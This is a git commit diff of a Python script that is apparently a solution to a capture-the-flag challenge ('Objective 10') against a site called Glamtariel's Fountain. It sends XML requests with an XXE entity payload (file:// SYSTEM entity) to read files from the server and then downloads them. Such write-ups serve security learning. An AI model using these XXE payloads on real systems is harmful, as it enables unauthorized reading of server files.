0765030bdd85a48b82c3f984b49ce1ff6efa4ed5
Thomas Bouve <crahan@n00.be>
2022-12-27 00:28:36 +0100

    Objective 10 done

--- docs/tools/objectives/o10/send_requests.py
+++ docs/tools/objectives/o10/send_requests.py
@@ -2,6 +2,7 @@
 """Talk to Glamntarial."""
 import os
 from datetime import datetime
+from typing import Optional
 
 import click
 import requests
@@ -14,10 +15,10 @@ TIMEOUT = 10
 DELAY = 120
 CSRF_TOKEN = None
 SESSION = requests.Session()
-LOOPS = 2
+LOOPS = 3  # 3 series of images
 
-imgs = ["img1", "img2", "img3", "img4"]
-
+entities = ["princess", "fountain"]
+images = ["img4", "img3", "img2", "img1"]
 files = [
     "/app/static/images/ringlist.txt",
     "/app/static/images/x_phial_pholder_2022/bluering.txt",
@@ -27,28 +28,24 @@ files = [
     "/app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt",
 ]
 
-entities = ["princess", "fountain"]
 
-
-def format_message(msg: str, msg_type: str) -> str:
-    """Format and colorize a message."""
+def printc(msg: str, msg_type: str):
+    """Pretty print a timestamped message."""
     now = datetime.now()
     timestamp = now.strftime("%Y-%m-%dT%H:%M:%S")
     message = f"{timestamp} - {msg}"
-
     msg_type_mapper = {
         "INFO": click.style(f"[-] {message}", fg="blue"),
         "SUCCESS": click.style(f"[+] {message}", fg="green"),
         "WARNING": click.style(f"[!] {message}", fg="yellow"),
         "ERROR": click.style(f"[E] {message}", fg="red"),
     }
-
-    return msg_type_mapper.get(msg_type.upper(), message)
+    click.echo(msg_type_mapper.get(msg_type.upper(), message))
 
 
 def get_csrf_token(response: requests.Response):
     """Update the value of the CSRF token."""
-    global CSRF_TOKEN
+    global CSRF_TOKEN  # pylint: disable=global-statement
 
     soup = BeautifulSoup(response.text, "html.parser")
     csrf_id = soup.find("meta", {"id": "csrf"})
@@ -57,8 +54,18 @@ def get_csrf_token(response: requests.Response):
         CSRF_TOKEN = csrf_id.attrs["content"]
 
 
+def print_response(json_response: dict):
+    """Pretty print an entity's response."""
+    resp_princess, resp_fountain = (
+        json_response["appResp"].replace("\n", " ").split("^")
+    )
+    printc(f"Image dropped on {json_response['droppedOn']}", "info")
+    print(f"Princess: {resp_princess}")
+    print(f"Fountain: {resp_fountain}")
+
+
 def download_file(path: str):
-    """Download a file"""
+    """Download a file."""
     filename = os.path.basename(path).split(",")[0]
     response = SESSION.get(
         f"https://glamtarielsfountain.com/{path}", headers={"X-Grinchum": CSRF_TOKEN}
@@ -67,9 +74,11 @@ def download_file(path: str):
     with open(filename, "wb") as fhandle:
         fhandle.write(response.content)
 
+    printc(f"Downloaded: {path}", "WARNING")
+
 
 def send_json_request(who: str, img: str):
-    """Send out a Pushover notification."""
+    """Send a JSON request."""
     response = SESSION.post(
         URL,
         timeout=TIMEOUT,
@@ -81,16 +90,14 @@ def send_json_request(who: str, img: str):
         json={"imgDrop": img, "who": who, "reqType": "json"},
     )
 
-    # print(response.headers)
-
     if response.status_code == 200:
         return response.json()
     else:
         return None
 
 
-def send_xee_xml_request(file: str):
-    """Send out a Pushover notification."""
+def send_xee_xml_request(file: str, img: Optional[str] = None):
+    """Send an XML request containing XEE."""
     response = SESSION.post(
         URL,
         timeout=TIMEOUT,
@@ -103,37 +110,9 @@ def send_xee_xml_request(file: str):
             '<?xml version="1.0" encoding="UTF-8" ?>'
             f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}" >]>'
             "<root>"
-            "<imgDrop>&xxe;</imgDrop>"
+            f"<imgDrop>{img or '&xxe;'}</imgDrop>"
             "<who>princess</who>"
-            "<reqType>xml</reqType>"
-            "</root>"
-        ),
-    )
-
-    if response.status_code == 200:
-        return response.json()
-    else:
-        return None
-
-
-def send_xee2_xml_request(img: str):
-    """Send out a Pushover notification."""
-    response = SESSION.post(
-        URL,
-        timeout=TIMEOUT,
-        headers={
-            "Content-Type": "application/xml",
-            "Accept": "application/json",
-            "X-Grinchum": CSRF_TOKEN,
-        },
-        data=(
-            '<?xml version="1.0" encoding="UTF-8" ?>'
-            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM "
-            '"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>'
-            "<root>"
-            f"<imgDrop>{img}</imgDrop>"
-            "<who>princess</who>"
-            "<reqType>&xxe;</reqType>"
+            f"<reqType>{'&xxe;' if img else 'xml'}</reqType>"
             "</root>"
         ),
     )
@@ -145,49 +124,45 @@ def send_xee2_xml_request(img: str):
 
 
 def start():
-    """Test."""
+    """Main app entry point."""
     # Initial request to get the CSRF token (aka, Ticket)
     response = SESSION.get(URL)
     get_csrf_token(response)
 
     # Ticket and cookie details
-    click.echo(format_message(f"Ticket: {CSRF_TOKEN}", "success"))
+    printc(f"Ticket: {CSRF_TOKEN}", "success")
 
     for cookie in response.cookies:
-        click.echo(format_message(f"Cookie: {cookie}", "success"))
+        printc(f"Cookie: {cookie}", "success")
 
-    # Send JSON requests to princess and fountain until we get the 4 rings
-    click.echo(format_message("Sending JSON", "info"))
+    # Send JSON requests to the princess and fountain until asked about 3 image groups
+    printc("Sending JSON", "info")
 
     for _ in range(LOOPS):
-        for img in imgs:
-            for entity in entities:
-                json_response = send_json_request(entity, img)
-                print(json_response)
+        for entity in entities:
+            for image in images:
+                json_response = send_json_request(entity, image)
+                print_response(json_response)
 
                 if json_response["visit"] != "none":
-                    click.echo(
-                        format_message(f"Visit: {json_response['visit']}", "warning")
-                    )
                     download_file(json_response["visit"])
 
-    # Switch over to XML requests to just the princess
-    click.echo(format_message("Switching to XML", "info"))
+    # Switch over to sending XML requests to the princess
+    printc("Switching to XML", "info")
 
     for file in files:
         xml_response = send_xee_xml_request(file)
-        print(xml_response)
+        print_response(xml_response)
 
         if xml_response["visit"] != "none":
-            click.echo(format_message(f"Visit: {xml_response['visit']}", "warning"))
             download_file(xml_response["visit"])
 
-    # Final request to share the silver ring
-    xml_response = send_xee2_xml_request("img1")
-    print(xml_response)
+    # Final request to share the silver ring and retrieve the gold ring
+    printc("Give silver ring", "info")
+    xml_response = send_xee_xml_request(files[-1], "img1")
+    print_response(xml_response)
 
     if xml_response["visit"] != "none":
-        click.echo(format_message(f"Visit: {xml_response['visit']}", "warning"))
         download_file(xml_response["visit"])
 
 
